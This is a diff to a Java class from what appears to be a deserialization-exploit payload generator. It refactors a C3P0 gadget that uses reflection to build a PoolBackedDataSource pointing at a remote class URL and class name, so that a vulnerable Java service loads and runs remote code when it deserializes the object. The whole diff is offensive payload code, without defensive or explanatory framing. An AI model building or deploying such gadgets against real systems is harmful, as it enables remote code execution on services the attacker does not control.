@@ -31,7 +31,7 @@ import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
  * @author mbechler
  */
 public class C3P0 implements ObjectPayload<Object> {
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
@@ -43,19 +43,7 @@ public class C3P0 implements ObjectPayload<Object> {
 
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(b);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return b;
     }
 
 
